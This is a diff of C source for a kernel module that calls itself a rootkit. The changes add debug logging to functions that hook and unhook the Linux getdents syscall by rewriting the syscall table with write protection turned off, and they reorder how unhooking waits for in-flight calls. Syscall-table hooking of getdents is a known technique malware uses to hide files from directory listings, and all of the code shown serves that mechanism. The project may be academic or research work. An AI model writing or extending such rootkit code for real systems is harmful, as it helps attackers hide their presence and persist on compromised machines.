@@ -224,6 +224,8 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
  */
 void
 hook_getdents(void) {
+	ROOTKIT_DEBUG("Hooking the getdents syscall...\n");
+	
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* initialize our spinlock for the getdents counter */
@@ -242,6 +244,7 @@ hook_getdents(void) {
 	/* reenable write protection */
 	enable_page_protection();
 
+	ROOTKIT_DEBUG("Done.\n");
 	return;
 }
 
@@ -250,26 +253,24 @@ hook_getdents(void) {
  */
 void
 unhook_getdents(void) {
+	ROOTKIT_DEBUG("Unhooking the getdents syscall...\n");
+	
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 
 	/* disable write protection */
 	disable_page_protection();
 
-	/* 
-	 * make sure that all processes have left our manipulated syscall. 
-	 * lock getdents_lock and keep it that way until we are done. 
-	 */
-	while(getdents_call_counter > 0) {
-		msleep(10);
-	}
-	spin_lock_irqsave(&getdents_lock, getdents_lock_flags);
-
 	/* restore the old syscall */
 	sys_call_table[__NR_getdents] = (int *) original_getdents;
 
-	/* release our lock on getdents */
-	spin_unlock_irqrestore(&getdents_lock, getdents_lock_flags);
-	
 	/* reenable write protection */
 	enable_page_protection();
+
+	/* ensure that all processes have left our manipulated syscall */
+	while(getdents_call_counter > 0) {
+		msleep(2);
+	}
+	
+	/* log our success */
+	ROOTKIT_DEBUG("Done.\n");
 }
